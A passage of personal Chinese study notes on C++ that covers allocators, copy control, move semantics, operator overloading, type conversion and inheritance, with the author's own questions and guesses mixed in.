必须是先前调用 allocate 时分配的大小；（如果是要释放整段内存，不知为何搞得这么复杂，莫非 a 里面没有保存起始位置和大小？） a.construct(p, arg)，构造一个 T 类型的对象，并存储在 p 指针指向的原始内存位置中； arg 做为参数（可零个或多个），用来传递给 T 的构造函数，用于构造对象使用； a.destroy(p)，对 p 指针指向的对象，执行销毁动作（即析构）； 奇怪构造的时候，有传递 args 构造函数参数，为什么销毁的时候，却没有传递析构函数？ 在使用 allocator 分配的内存时，需要先使用 construct 方法构造对象；未构造的内存使用会产生未定义的行为； 拷贝和填充未初始化内存的方法 uninitialized_copy(b, e, b2)，拷贝迭代器 b&#x2F;c 指向的范围内的元素，到 b2 迭代器指向的位置及之位置；需要确保 b2 之间的空间足够大，能够容纳所有 b&#x2F;e 之间的元素；返回 b2 递增之后的迭代器； uninitialized_copy_n(b, n, b2)，拷贝从迭代器 b 开始之后的 n 个元素，到 b2 指向的位置之后；同样需确保 b2 之后的空间足够大； uninitialized_fill(b, e, t)，将值 t 填充到 b&#x2F;e 指向的范围段； uninitialized_fill_n(b, n, t)，将值 t 填充到 b 之后的 n 个位置； 经过测试发现，uninitialized_copy 事实上会调用类的拷贝构造函数；如果类没有正确定义拷贝构造函数，uninitialized_copy 的行为有可能会出错； 当某个类的静态数据成员声明为 allocator 类时，还需要在类外部定义这个数据成员，定义的方法为 allocator SomeClassName::alloc; 貌似这种用法是使用默认初始化？ 如果不在类外部进行定义，编译时会报错，提示静态变量未定义； 猜测原因：由于 allocator 类的目标在于实现内存分配和对象构造的分离，因此声明的时候，仅是分配了内存，并未构造任何类型的对象，这个时候访问这段内存将会是未定义的行为；所以需要另外对其进行定义，才可避免未定义的访问行为； 使用标准库：文本查询程序 程序设计 开始程序设计的一个好的方法，是先罗列出程序允许的操作，然后通过操作可以推导出合适的数据结构，例如选择使用 vector，set，map等； shared_ptr 可以用于类之间实现共享数据，即 B 类的数据为 A 类数据指针或迭代器； 但貌似这样两个类对象之间的耦合很深，其中一个对象的有效性，依赖于另外一个对象的生命周期；有时候如果不小心已经销毁了数据对象，则可能会出现未定义行为； 拷贝控制 拷贝、赋值、销毁 类是一种数据的抽象（很像 SICP 第2章的内容），它创建了一种新的数据类型，新数据类型也意味着需要有对应新的运算行为，这样才能够发挥数据类型的抽象作用；除了成员函数外，任何数据类型通常需要有一些通用的基本操作，包括拷贝、赋值、移动、销毁等；如果我们不显式的定义这些行为，编译器会自动定义（但使用效果很可能与我们的预期不一致），因此，在设计类的时候，就要优先先设计好这些基本行为的操作方式；之后再考虑它们的成员函数（好奇当我们只是将类的实例对象，做为一种数据容器进行使用时，设计定义以上四种基本行为，是否仍然有必要性？）（答：有时候有必要，取决于是否可以让计算更加简便，让代码拥有更高层次的抽象）； 拷贝构造函数：只有一个参数，参数是自身类型的引用，其他任何额外参数都有默认值； 如果我们不自己显式定义一个，编译器就会帮我们合成一个；但有时候合成的可能不是我们想要的；合成的拷贝构造函数，数据成员的类型决定了成员会如何被拷贝，内置类型直接拷贝，类类型由使用其默认构造函数，数组类型则依次拷贝其中的每个元素； 拷贝构造函数用于拷贝初始化的场合（感觉跟直接初始化很像，只是我们不是直接提供数据成员参数，而是提供一个对象，然后用这个对象的数据成员，来初始化我们新建的对象的数据成员）（听说如果在类里面定义了移动构造函数，则拷贝初始化有时会使用移动构造函数来完成，暂时还不知道为什么这么做）（答：这么做是为了减少拷贝的性能开销，用移动更快） 参数必须为引用类型的原因在于这样一个使用场景，即某个函数定义的形参是非引用类型，因此当用实参给形参赋值时，会触发拷贝构造行为，此时开始调用形参的拷贝构造函数，如果拷贝构造函数的参数是非引用类型，则意味着需要调用构造函数的形参的拷贝构造函数，这样一层一层的嵌套循环进去，无法终止；因此，只有设置为引用类型，才能避免此问题；（从性能上来说，正常也应该设计为引用类型） 拷贝初始化触发场景包括： 使用等号赋值运算符 &#x3D; 对象做为实参传给调用函数的形参； 函数调用返回非引用类型的对象 用花括号列表初始化数组中的某个元素 某些类类型（如容器）在新增对象成员时（例如标准库容器的 push_back 之类的操作）； 赋值运算符 同拷贝构造函数，如果没有自定义赋值运算符，编译器会自动合成一个； 重载赋值运算符本质上是一个函数，由两部分构成：关键字 operator 加上运算符号，例如 operator&#x3D;；该函数以赋值等号左侧的运算对象为参数，返回左侧运算对象的类型的引用；左侧运算对象隐式的绑定到函数的 this 参数； 示例：Foo&amp; operator&amp;(const Foo&amp;); 如果某个成员变量是指向动态内存的内置类型指针，则在定义赋值运算符时，记得应先释放原来的动态内存，然后再赋值新分配的内存； 经测试发现，当使用等号赋值时，编译器经常会跳过赋值运算符函数，转为调用拷贝构造函数，不知为何（即使我们没有定义拷贝构造函数也是如此，显然此时编译器会自动帮忙合成一个拷贝构造函数）； 析构函数 析构函数也是类的成员，由波浪号+类名+圆括号组成，它不接受任何参数，也没有返回值；由于没有参数，也意味着不能实现重载，一个类只有一个析构函数；示例 class Foo { ~Foo(); &#x2F;&#x2F; 此处即为析构函数 } 内置类型的成员，没有析构函数，因为没有销毁的工作；类类型的成员，执行类类型相应的析构函数（好奇如果最终所有成员，包括嵌套的类类型成员，都是由内置类型组成的，那么所谓的销毁释放资源到底做了些什么工作呢？）（在离开变量的作用域的时候，变量使用的内存资源会被释放，估计是使用栈的内存回收机制来实现内置类型的资源回收吧） 执行析构的五个场景 当变量离开了作用域； 临时对象的创建表达式完成了运算； delete 动态内存； 容器销毁时，其元素成员跟着销毁； 类对象销毁时，其数据成员跟着销毁； 当没有自定义析构函数时，编译器会自动合成一个，合成的析构函数的参数体为空； 事实上，析构函数本身并不会销毁任何成员，它更像开始析构工作的一个符号；真正的销毁，发现在析构函数执行之后； 一般来说，析构函数的函数体内为空，但是，当有数据成员是指向动态分配内存的指针时，应记得在函数体内使用 delete 关键字来回收内存； 三五法则 如果一个类需要自定义析构函数，几乎可以肯定它也需要自定义自己的拷贝构造函数和赋值运算符函数； 需要自定义析构函数，基本上意味着手工管理内存，因此，也即意味着拷贝或赋值的时候，也需要参与管理旧内存的释放； 需要拷贝操作的类，也需要赋值运算符操作，反之亦然；但不一定需要自定义析构函数； 拷贝操作和赋值操作其实是某种行为的一体两面，它们都是想实现用一个已经存在的对象，去初始化另外一个新对象； 如果拷贝构造函数具备生成唯一值的数据成员，那么要特别注意以该类类型为参数的成员，形参需要设置为引用类型，不然传递参数的过程中，会触发拷贝，生成一个不一样的新对象； 示例：应为 void f(number s&amp;) { … } ，而不是 void f(number s) { … }; 三五法则中的“三”猜测是指三个控制类拷贝的操作：拷贝构造、拷贝赋值、析构；在新标准下，增加了移动构造和移动赋值，所以共同有了“五”； &#x3D;default 可以通过使用 &#x3D;default 关键字，来显式的告知编译器帮忙合成默认的成员函数（如果不这么做，编译器则是隐式操作，正常它会自动合成，但有时候不会）；示例 Sales_data() &#x3D; default; （合成默认构造） Sales_data(const Sales_data&amp;) &#x3D; default; （合成拷贝构造） Sales_data&amp; operator&#x3D;(const Sales_data&amp;) &#x3D; default; （合成赋值运算符） ~Sales_data() &#x3D; default; （合成析构） 阻止拷贝 不管是显式的自定义，还是隐式的默认合成，大多数类应该定义构造函数、拷贝函数和析构函数，但是在某些特殊的场景下，阻止类的拷贝功能有时候是有必要的（为什么？什么时候？）； 可以通过 &#x3D;delete 关键字，来显式的告知编译器阻止成员函数的执行；（ &#x3D;delete 标注的成员函数，有个奇怪的名称，叫做删除的函数） &#x3D;delete 必须出现在函数声明的地方，而不能像 &#x3D;default 一样定义在函数外部；原因：阻止成员函数的执行，意味着在任何可能发生的调用前，提前知道它是一个删除函数，从而阻止调用的发生；如果定义在函数外部，则在声明和定义之间的调用，不会被阻止； &#x3D;default 只能用于构造和拷贝函数，但 &#x3D;delete 可以用在所有的成员函数身上（但暂时不确定这种用途的目的是什么） 析构函数不可以标记为 &#x3D;delete，不然对象资源无法被释放； 编译器自动合成的拷贝控制成员有可能标记为删除的（为什么？）规则：如果类里面有一个成员不能默认构造、拷贝、复制和销毁，则对应的合成版本的成员函数将被定义为删除的（据说引入这条规则的原因：在于避免创建无法销毁的对象出来；由于无法自动合成，便意味着程序员需要手工编写，如果没有编写，在使用的时候，就会出现报错，从而提醒编写） 如果类有个成员是 const 类型，则不能使用合成的拷贝函数，因为我们无法给一个 const 成员做赋值操作（这么说只能自定义一个拷贝函数了？）； 如果类有个成员是引用类型，则编译器不会合成默认的构造函数，因为初始化构造需要从外部传入一个对象的引用，但合成的默认构造函数却没有参数；同时合成的拷贝赋值运算符函数也会被定义为删除的，因为对象已经初始化过了，引用类型的成员，已经指向了某个对象，此时再次赋值，并不会改变引用的指向，而是改变了引用指向的对象的值，显然这不是我们所期望的； 原则：如果类存在不能拷贝、赋值或销毁的成员时，那么合成的拷贝控制函数成员，就会被定义为删除的；（估计是为了更加安全的考虑） 在 C11 标准之前，为了阻止拷贝，使用将成员定义为 private 的方法（旧方法）；对于友元，则通过只声明不定义的方法；（当使用这种方法时，如果某些代码不慎进行拷贝操作，编译器将会抛出错误）；在新标准中，直接使用 &#x3D;delete 关键字来声明就可以了；1. 如果 C++ 像 python 一样，没有所谓的自动合成功能，可能就不会有这么多事了；但问题有没有可能是因为 C++ 支持手工管理内存，导致引入了以上一系列操作的复杂性？因为手动分配内存，意味着还要手动的回收内存，从而使得垃圾自动回收机制失效了？ 拷贝控制和资源管理 据说，管理类外资源的类，需要定义拷贝控制成员（但什么是类外资源呢？可能指资源在类的外部）（动态内存即是一种类外资源，因此如果有成员是内置指针类型的话，意味需要定义专门的析构函数来释放分配的内存空间；而当一个类需要定义析构函数时，也意味着它需要自己的拷贝控制成员函数了）； 类的拷贝操作，有两种语义，一种是像值的独立状态，一种是像指针的共享状态； 类里面的数据成员分两种，一种是内置类型，一种是指针类型；对于前者，拷贝的时候，应该直接拷贝值；对于后者，则有两种处理方案，即可以让它们像值，也可以让它们像指针； 定义赋值运算符时，为了能够应对自赋值的情况，在释放资源之前，需要先拷贝一份资源到临时对象，然后再释放；不然如果先释放，就无处可以拷贝了； 大多数赋值运算符，结合了拷贝函数和析构函数的功能； 管理类外资源的释放，最好使用 shared_ptr，如果不能用，则只能定义自己的引用计数来管理了（感觉差不多相当于自己实现 shared_ptr 了）； 当使用指针的时候，不管是智能指针，还是普通的内置指针，它都意味着手工管理内存了，差别在于智能指针会将内存释放，而内置指针而不会；当然，内置指针指向的内存，仅为手工动态分配的时候，才需要手工释放，如果是在栈中自动分配的，则不需要手工释放；问题是，要如何解决内置指针的空悬问题？以及，如何才能在栈中内存呢？ 交换操作 据说管理资源的类，通常还会定义一个 swap 函数，不知为何？答：为了减少移动内存的开销，转而通过移动指针来实现目的；那么对于没有管理资源的类呢？设计一个 swap 函数是否还有必要？（据习题 38 说是没有必要！） 标准库的 swap 函数，使用的是类的拷贝构造和赋值函数，潜在的内存开销可能很大，因此我们可以通过定义自己版本的 swap 函数，来减少这种开销； 定义 swap 不是必要的，但是定义了后，有利于优化函数的性能； 定义 swap 还有另外一个好处是它可以用来实现赋值运算符的重载；正常情况下，赋值运算符的重载，需要小心处理自赋值可能出错的情况，而 swap 原理，使用在销毁旧对象之前，会先做一份副本，所以即使出现自赋值的情况，它也是安全的； 假设我们通过 using std::swap 进行了声明后，此时在代码中是可以直接使用 swap 进行函数调用，而不再需要前缀 std；但实际上，当 swap 参数的类型有定义自己版本的 swap 函数时，此时编译器会自动优先匹配类类型的自定义版本； 内置类型是没有自己的自定义版本的 swap 函数的，因此当 swap 的参数是内置类型时，swap 会匹配标准库版本； 拷贝控制示例 那么对于没有管理资源的类呢？设计一个 swap 函数是否还有必要？（据习题 38 说是没有必要！） 动态内存管理类 终于知道移动函数的用途了，它的出现，是想尽可能的减少值在内存上拷贝带来的开销增加；另外有些类类型本身也不支持拷贝，例如 io 类和 unique_ptr 类； move 函数定义在标准库头文件 ; 作用：获取某个左值变量绑定的资源，断开绑定关系，将变量置为可安全销毁的状态； 对象移动 右值引用 左值和右值是相对表达式而言的；一般而言，左值表达式表示对象的身份，右值表达式表示对象的值； C11 通过引入 &amp;&amp; 来表示右值引用； 左值引用应绑定到左值，右值引用应绑定到右值；唯一的例外是 const 引用可以绑定到右值； 右值的生命周期是短暂的，它要么是一个字面值常量，要么是一个求值过程中临时创建的对象； 右值引用的特征：所引用的对象将要被销毁，该对象没有其他用户； 左值引用（例如变量）的生命周期是持久的，直到离开作用域时，才会被销毁； 变量是左值，因此，我们不能声明一个右值引用变量，去绑定一个左值变量；但我们可以显式将这个变量转换成右值，然后赋值给一个右值引用变量；相当于将原变量管理的资源，变成临时的了，并交付给新的右值引用变量进行托管，之后很快就会销毁它；原来的左值变量不再指向原资源了，我们可以销毁原来的左值变量，也可以给它赋值，让它指向一个新的资源，但我们永远无法再通过它，找回旧资源了； 标准库新函数 move 的调用，只能通过 std::move，而不能仅写 move（原因：为了避免命名冲突，引起歧义）； 错误集 对于 vector a(100)，a[0] 本质上是一个左值表达式，它返回的是一个身份，这个身份背后的值是可以随时改变的； 移动构造函数和移动赋值运算符 移动构造函数的作用，跟拷贝构造函数差不多，差别在于它的参数是一个一右值引用，意味着它夺取资源后，还要负责善后，即将源变量与资源的绑定断开，并让源对象处于有效的，且可以被安全销毁的状态； 在编写移动构造函数的时候，我们还可以加上 noexcept 关键字备注（原因：由于移动构造不分配内存，意味着它不会报异常，因此加上这个关键字后，可以通知标准库无需为发生异常进行准备工作，可以减少一些工作开销，提高性能）； 标准库容器的方法中，提供了即使抛出异常，也不会去改变原有值；为了达到这种效果，它需要做隔离措施；这种隔离是有性能成本的；它的隔离措施就是使用类的拷贝构造函数，因为拷贝构造函数总是新建一块内存进行相关操作，不会去改动原来的值；如果想让标准库取消这种保护措施，就需要通过关键字 noexcept 显式的告知它； noexcept 关键字是 C11 引入的，它的位置一般置于函数参数列表右侧；如果是构造函数，则置于参数列表右侧和初始化列表冒号之间位置； 仅当一个类没有任何自己版本的拷贝构造函数和赋值运算符，且所有的非 static 成员都是可以移动的时候，编译器才会为这个类合成移动构造函数和移动赋值运算符； 内置类型都是可以移动的； 标准库容器有定义自己的移动函数，所以它们也是可以移动的； 移动操作永远不会隐式的定义为删除的函数；除非要求编译器合成，但有成员不可移动，这时编译器合成的移动操作，会被标注为删除的函数； 有四条规则会导致合成的移动操作被标注为删除的 三条都是因为有成员不可移动（例如有成员是 const 或引用） 一条则是因为类没有析构函数， 如果一个类只有拷贝构造函数，没有移动构造函数，那么即使参数传递的是一个右值，也会调用拷贝构造函数（事实上：用拷贝构造函数总是安全的） 拷贝控制成员总共有5个，当需要自定义其中任何一个时，基本上也意味着需要定义其他4个；一般来说，拷贝一个成员会导致一些额外的开销，有时候这种开销是非必要的，此时就可以通过定义移动拷贝成员，来减少开销优化性能； 移动操作确实可以带来性能提升，但它的使用需要非常小心，因为它也很容易带来不易发现的错误；正常情况下不建议使用，直至出现性能瓶颈时才考虑使用； 普通的迭代器，解引用返回左值，当我们将这个左值，做为参数传递给函数时，一般会触发拷贝构造函数；为了提高性能，我们可以使用标准库的 make_move_iterator 函数，将普通的迭代器，转换成移动迭代器；移动迭代器的特点是，它的解引用是返回一个右值；然后当我们将这个右值传递给函数时，会触发移动构造函数，从而提高了性能； 右值引用和成员函数 类似于拷贝函数，其他普通的成员函数，也可以定义两个版本，一个版本的参数是左值，一个是右值；这样做的目的，也是为了根据情况提高性能； 事实上，对于 vec.push_back(“done”) 的情况，由于实参是一个右值，所以它实际上就是在调用参数为右值版本的成员函数； 在旧标准中，有时候会出现莫名其妙的写法，例如 s1 + s2 &#x3D; “wow”，为了解决这个问题，新标准引入了一个引用限定符”&amp;”或”&amp;&amp;”，来强制要求左值必须是一个引用，不能是一个值；引用限定符放在函数的参数列表右侧； 示例： Foo&amp; operator&#x3D;(const Foo&amp;) &amp; &amp; 表示 this 必须指向左值，&amp;&amp; 表示 this 必须指向右值； 引用限定符只适用于非 static 函数，且必须同时出现于声明和定义中； 如果函数还有 const 限定符，则引用限定符的顺序，应该放在 const 限定符的右侧，即 const &amp;； 同 const，引用限定符也可以用来区分函数的重载版本；但有一点需要特别注意，当我们使用引用限定符来区分成员函数的重载版本时，必须所有相同参数列表的同名函数都加上重载限定符，不管是一个 &amp; 还是两个 &amp;&amp;（参数不同则没有关系）；这一点与 const 的使用方式有所不同； 重载运算与类型转换 基本概念 内置类型已经定义了运算符的运算规则，因此它们的运算看起来简单明了；类做为数据的一种更高层级抽象，运算符重载有利于让类的运算，像内置类型一样的简单明了； 重载运算符不能有默认实参（除 operator() 以外？）（好奇 operator 这个函数有什么用途？运算符重载？）（operator() 相当于要重载圆括号运算符了？） 当运算符函数做为某个类的成员函数时，它的第一个参数将默认为 this，并做为运算符的左侧运算对象； 不是所有的运算符都可以被重载的，有少数几个不行（貌似有4个，分别为双冒号”::”，点星号 “.*”，点号 “.”，问冒号”?:”）； &amp;&amp; 和 || 运算符由于存在特殊的性质（顺序导致短路求值），因此不建议对它们进行重载，因为重载的版本会失去这些特性，会导致使用者的不适应，很容易用错； 逗号和取地址运算符 &amp; 也不建议重载，因为它们已经有了内置的含义，重载容易引起歧义； 运算符重载时，它的参数必须是类类型，不允许是内置类型；也就是说，我们无法对内置类型的运算符进行重载； 我们也不能重载不存在的运算符； 运算符函数可以隐式的调用，就像内置类型的运算一样，也可以通过名字进行显式调用，它们是等价的，例如 operator+(a, b) 等价于 a + b；（前者的方式很像 scheme，这种方式事实上更好，歧义更少） 在设计类的时候，先想好类需要定义哪些操作，然后再思考这些操作是否适用于通过重载运算符来实现；如果适用的话，一般使用重载的方式是推荐的方法； 不过这里面也有一个问题，即如果定义了某个重载的运算符，很可能意味着要定义一组，比如整组的算术，整组的逻辑等（当能使用一个时，调用人可能想当然的以为其他运算符也可能可以用） 仅在运算符的含义非常的清晰明了，不会发生任何歧义的情况下，才建议使用重载，不然可能使用良好命名的普通函数更好； 重载的运算符函数，可以做为类的成员函数，也可以做为普通非成员函数； 做为成员函数时，其局限性是第一个参数必须是 this，因此这也意味着这种运算符的调用需要特别注意，不能搞反顺序，不然就匹配不上函数； 而定义为非成员函数时，则不存在这个限制，只要类型能够转换，就能运行； 输入和输出运算符 输出运算符不应负责格式，它应只管输出内容即可；格式应该由调用者另外定义，不然容易失去使用的灵活性； 输出运算符一般返回 ostream 引用，以便与其他输出运算符保持一致； 输入输出运算符必须定义成非成员函数，然后被声明为友元，以便读取类的数据成员； 输入运算符重载时，记得它必须处理读入失败的情况，设计当出现失败的情况时，应采取的行为，以便可以从错误中恢复（这一点输出运算符则不需要） 有时候输入运算符还需要做一些数据验证的工作，当出现不合格的输入时，可以通过设置流的条件状态来标示失败信息； 算术和关系运算符 算术和关系运算符一般定义为非成员函数； 如果类定义了算术运算符，则一般它也会定义一个复合赋值运算符；当有了复合赋值运算符，其实便可以使用它来实现算术运算符； 当定义了相等运算符后，一般也应该定义一个不等运算符，后者可以基于前者实现，即直接在前者的运算结果上进行取反； 定义关系运算符需要满足以下两个前提条件（简单的说，如果存在唯一可靠的 &lt; 定义，则应该考虑定义；如果还存在 &#x3D;&#x3D; ，则当且仅当 &lt; 的定义和 &#x3D;&#x3D; 产生的结果一致时，才定义 &lt; ） 对象有顺序关系，具备可比性； 当两个对象不相等时，意味着必然有一个小于另外一个； 赋值运算符 除了前面已经学过的拷贝赋值和移动赋值，事实上还可以定义各种赋值运算符，区别在于接受的参数类型不同；比如接受一个其他类型的参数； 不管哪种情况，赋值运算符都必须定义为成员函数（为什么？） 赋值运算符应返回一个当前类型的引用； 复合赋值运算符一般也应定义为成员函数 下标运算符 下标运算符必须是成员函数； 下标运算符通常以所访问元素的引用做为返回值（好处：下标运算符可以出现在赋值运算符左右的任意一侧） 一般最好定义常量和非常量两个版本的下标运算符； 递增和递减运算符 递增和递减运算符一般建议设置为成员函数，因为它们改变的刚好是所操作对象的状态； 递增和递减应该同时定义前置和后置版本；但是要如何区分呢？通过给后置版本增一个 int 形参来进行区分；当需要显式调用后置版本时，需要提供一个 int 参数，例如 0； 后置版本应该返回值，前置版本返回引用； 当定义好前置版本后，在定义后置版本时，可以使用前置版本来实现相应的功能（它还顺便承包了检查有效性的工作）； 成员访问运算符 一般在迭代器类和智能指针类中需要用到成员访问运算符； 箭头运算符必须是类的成员； 解引用运算符一般是类的成员，但非强制要求； 箭头运算符永远用于获取成员，这点事实不可通过重载变更； 重载的箭头运算符，要么返回类的指针，要么返回定义了 operator-&gt; 的类的对象，二者只能选其一，除此之外都将报错； 函数调用运算符 当类定义了调用运算符时，它的行为很像函数，由于它还能够同时存储状态，相比函数，用起来会更加灵活，被称做函数对象； 调用运算符必须是类的成员函数；一个类可以定义多个不同版本的函数调用运算符，只需要在参数数量和类型上面有所区分即可； 函数对象常常用于泛型算法的实参 例如：for_each(vs.begin(), vs.end(), printString(cerr, “\\n”)); 在编译器的眼里，lambda 的本质上其实就是一个未命名类的未命名对象，这个对象定义了一个函数调用运算符 如果 lambda 捕获的变量是引用类型，则生成的未命名类不需要数据成员；但如果捕获的变量是值类型，则需要数据成员临时保存捕获变量的值； 标准库定义的函数对象 标准库中定义了一组表示算术运算符、关系运算符、逻辑运算符的类，这些类中，定义了相应的函数调用运算符，可用来对参数进行相应的运算； 示例 plus intAdd; int sum &#x3D; intAdd(10, 20); 算术运算函数对象：plus, minus, multiplies, divides, modulus, negate 关系运算函数对象：equal_to, not_equal_to, greater, greater_equal, less, less_equal 逻辑运算函数对象：logical_and, logical_or, logical_not 这些标准库函数对象，有一个非常好的用途，即可以用来替换算法中的默认运算符 sort(sv.begin(), sv.end(), greater()) 关联容器，例如 map 或 set，即是使用 less 对元素进行排序； C++ 中有多种可调用对象，包括函数、函数指针、bind 函数创建的对象、重载调用运算符的类、lambda 表达式等；这些不同类型的可调用对象，却可能使用相同的调用形式，即返回类型和实参类型的声明格式，例如int(int, int) 通过引入 function 类型，从返回类型与实参类型入手，对不同的可调用对象，在调用形式维度进行格式化，然后就可以使用 map 容器来管理这些不同类型的可调用对象了； 不能使用重载函数的名字，来将重载函数直接存入 function 类型容器中，因为它名字可能会带来歧义，更好的做法是使用指针指向要存储的函数，避免名字的歧义问题； lambda 则不存在歧义的问题了； 重载、类型转换和运算符 类型转换运算符 格式：operator type() const; 类型转换函数必须是类的成员函数，它不能有返回类型，形参列表为空，由于不改变待转换对象的内容，故一般定义为 const； 构造函数可以使用其他类型的对象，初始化创建当前类型的新对象；类型转换函数则可以将当前类型，转换成其他想要的类型（一般来说，这种转换是隐式执行的）； 如果待转换的目标类型，与当前类型不存在明显的一一映射关系，则应该谨慎使用类型转换，因为它很容易带来理解上的歧义，从而导致使用上的错误； 一般来说，很少为类定义类型转换，因为这种转换隐式的发生，经常容易带来困惑，麻烦多于帮助；仅有一种例外情况：，即向 bool 类型的转换； int i &#x3D; 42; cin &lt;&lt; i; 在旧标准中，以上表达式可以编译通过，但会产生意想不到的结果，即 cin 被隐式转换成 bool 类型，然后进一步变成 int 类型，最终结果为 0 或 1 做左移42位的运算； 为了避免这个问题，新标准引入了 explicit 关键字，来指明类型转换要显式的执行； explicit operator int() const; 例外情况：当表达式出现在条件语句中时，显式的类型转换会被隐式的执行； bool 类型的转换，也应该定义成 explicit 的； 只定义了单一实参的非显式构造函数，提供了从实参类型到类类型的转换途径； 避免二义性的类型转换 最好不要在两个类之间定义相同的类型转换方法，因为当这个两个类出现在同一个表达式当中的时候，编译器将不知道应该使用哪个类型转换的方法； 当 A 类定义了向 B 类转换的方法，那就不要在 B 类中再定义向 A 类的转换方法； 也不要在类中定义两个或以上转换源或转换目标是算术类型的转换，原因：编译器不知道用哪个； 例如两个转换目标分别是 int 和 double，当对象出现在 long double 场合时，两个转换都不能完全匹配，此时就会导致二义性错误； 例如两个源分别是 int 和 double，当转入的参数是 long 时，由于不能完全匹配，也会出现二义性问题； 避免转换目标是内置算术类型的转换； 除了向 bool 类型的转换后，应该尽量避免定义其他类型转换； 当存在重载的函数时，如果这些函数的参数所涉及的类，本身提供了类型转换，则将使得重载函数的匹配问题变得复杂起来； struct A { A(int) } &#x2F;&#x2F; 接收 int 参数实现初始化 struct B { B(int) } &#x2F;&#x2F; 接收 int 参数实现初始化 void manip { const A&amp; } &#x2F;&#x2F; 定义了接收 A 类型参数的函数 void manip { const B&amp; } &#x2F;&#x2F; 定义了接收 B 类型参数的函数 当出现 manip(10) 的时候，出现二义性问题，不知应该对应匹配上面的那个函数； 函数匹配与重载运算符 表达式的运算符，其候选函数集既包括成员函数，也包括非成员函数；（当如果是以函数名进行调用，或者以对象的方法名调用，则不存在此问题） 在一个类中，既定义了目标是算术类型的转换，也定义了重载的运算符，则会出现二义性问题； 面向对象程序设计 OOP 概述 虚函数：当基类要求某些成员函数必须由派生类各自定义自已的版本时，就将它们声明成虚函数； 目测目的好像是为了实现多态（即所谓的动态绑定） C++ 使用类派生列表来实现继承，使用方式为在类名右侧加冒号加基类名称 示例: class child: public parent { … } 派生类必须在其内部对所有需要重新定义的虚函数进行声明； 定义基类和派生类 基类通常需要定义一个虚析构函数，即使它可能不会被用到 原因：为了实现动态绑定，即析构的时候，调用正确版本的派生类对象的析构函数； 基类通过 virtual 关键字来控制派生类是否覆盖它的方法；当定义了 virtual 的成员函数时，即显式的要求派生类必须重新定义自己版本的成员函数； virtual 是实现多态的关键；一旦某个成员函数标注为 virtual，意味着调用该成员函数时，编译器会去相找最合适的版本； 目测好像派生类也可以不覆盖基类的虚函数？如果不打算覆盖的话，为何要声明成虚函数呢？ 如果基类把某个函数声明成 virtual，则该函数在派生类中，默认也是 virtual 类型； 这么说在派生类中，是否写出 virtual 关键字就不是必要的了？是的； 派生类可以访问基类的 public 和 protected 成员，但不能访问 private 成员；普遍代码则只能访问基类的 public 成员； 派生类继承基类时，对基类的访问有三种说明符，分别是 public&#x2F;private&#x2F;protected（它们之间的区别是什么？） 目的：用于控制从基类继承来的成员，是否对派生类的用户可见； 原因：派生类对象实际是多个子对象组成的复合对象；每个子对象负责定义自己的成员； 当派生类对基类的某个方法进行覆盖时，貌似需要使用 override 关键字？ 后来发现不写这个关键字也行，但写了更好，因为它显式的声明当前函数的意图是要覆盖基类的版本； 如果不写的话，即使两个函数的形参列表不同，也能够编译通过，因为编译器会将其当做一个新的独立函数，不会发生覆盖；但这种结局可能并不是我们想要的，所以说，写上 override 关键字是更稳妥的做法；不然这种错误是很难发现的； 每个类控制它自己的成员初始化过程；意味着一个对象的基类成员，是由基类完成初始化的；派生类成员则由派生类完成初始化； 首先初始化基类的部分，然后按照声明的顺序初始化派生类的部分； 派生类也可以直接赋值所有成员，但这样就失去了抽象性，会使得维护变得困难； 例如当有一个基类有多个派生类时，如果每个派生类都直接初始化其所有成员，当基类有发生变化时，变成每个派生类都要修改一遍，工作量大且易出错； 一个派生类的对象，实际上是由多个子对象组成的；一部分是基类的子对象，一部分是派生类自己的子对象； 由于一个派生可能由多层继承而来，因此它有可能包括多个基类的子对象；这些基类包括直接基类和间接基类； 派生类的作用域是嵌套在基类的作用域里面的； 虽然我们可以显式的在派生类的构造函数中，手工给基类成员赋值，但最好不要这么做，而将参数传递给基类的构造函数进行初始化更加合理；即遵循基类接口的原则 原因：估计是为了将来的维护方便，保持良好的抽象层次性； 对于基类的静态成员，它只能被定义一次，并且在整个继承体系中，仅有一个实例；即使有多个派生类也是如此； 派生类的声明格式，跟普通类的声明一样，并没有派生列表；派生列表仅出现于派生类定义的位置； class Bulk_quote: public Quote （错误） class Bulk_quote （正确） 基类在被继承前，应先定义其所有的成员 原因：不然派生类无法使用基类的成员； 如果有部分基类的成员，定义在派生类声明的位置之后，会发生什么情况？ 通过在类名后面加上 final 关键字，可以显式的声明此类不可被继承； 后来发现还可以给成员函数加上 final 关键字，用来声明该成员函数不可被派生类覆盖； 看来这个关键字的作用跟 virtual 有点相反，virtual 显式要求覆盖，final 则显式要求不可覆盖 正常情况下，指针或引用所绑定的对象，应该与指针或引用的类型相同；但是，这条规则在有继承关系的类的身上，不适用，基类指针可以指向派生类（因为派生类包括基类的子对象）； 原因：派生类对象包含基类的子对象； 但是，反方向是不行的，即派生类指针不可以指向基类； 从派生类到基类的转换，只对指针或引用类型有效（那么意思是说对其他数据类型无效？） 基类的指针或引用的静态类型，可能与其动态类型不一致 目的：为了实现动态绑定；让外部用户不用关心差异，使用更加方便； 当我们使用一个派生类对象，去初始化或赋值一个基类对象时，只会保留基类子对象的成员，并抛弃派生类子对象的成员； 虚函数 动态绑定只会在通过指针或引用调用虚函数时，才会发生； 目测这个指针还必须是指向基类的指针或引用，如果是指向派生类的指针，则也不存在动态绑定的问题； 而且调用的还必须是虚函数，因为只有虚函数的场景，派生类的函数定义才与基类不同； 派生类的虚函数的形参列表必须与基类的虚函数完全一致（不然就应该被视为一个新函数了） 正常情况下返回类型也应该相同，除非是返回一个指向当前类型的指针或引用； 如果基类的虚函数使用了默认实参，则这个实参是不可被覆盖的，即实际运行的派生类的虚函数，也会使用基类的默认实参； 可以通过引入作用域运算符，来显式指定到底要调用哪个版本的虚函数，从而回避了编译器的动态判断 double undc &#x3D; baseP-&gt;Quote::net_price(42); 这种场景一般发生在派生类的成员函数，想要调用基类的虚函数版本；此时如果不指定版本，就会调用它自己的版本，而不是基类的版本； 抽象基类 纯虚函数要实现什么样的设计意图？ 为了避免被实例化对象； 纯虚函数只有声明，无需定义，通过在右侧加上关键字 “&#x3D;0” 来表示身份； 如果要定义的话，必须定义在类的外部，不能定义在类的内部；（为什么呢？） 含有纯虚函数的类，称为抽象基类；抽象基类不能实例化对象；抽象基类的派生类，如果覆盖了纯虚函数，就可以实例化对象； 重构：重新设计类的继承体系，并将操作或数据从一个类转移到另外一个类中；同时以前使用了该类的代码不需要进行改动； 访问控制与继承 每个类除了负责初始化自己独有的成员外，还控制其派生类是否能够访问自己的成员； 